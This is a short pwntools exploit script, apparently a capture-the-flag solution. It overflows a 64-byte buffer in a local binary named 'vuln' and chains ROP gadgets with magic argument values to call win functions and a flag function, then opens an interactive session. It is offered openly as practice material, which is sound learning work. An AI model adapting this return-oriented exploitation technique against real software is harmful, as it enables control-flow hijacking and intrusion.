#!/usr/bin/env python2

from pwn import *

bin = ELF('./vuln')
p = process('./vuln')

main = p64(0x4008ce)
padding = "A"*64
win1 = p64(0x400767)
win2 = p64(0x400781)
win = p64(0x4007be)
flag = p64(0x40084d)
main = p64(0x4008ce)

pop_rdi = p64(0x4009a3)
pop_r15 = p64(0x4009a2)
pop_3 = p64(0x40099e)


payload = padding + pop_rdi + main + pop_r15 + p64(0xDEADBEEF) + win1 + pop_3 + p64(0xBAADCAFE) + p64(0xCAFEBABE) + p64(0XABADBABE) + win2 + flag 


p.recvline()
p.sendline(payload)
p.interactive()
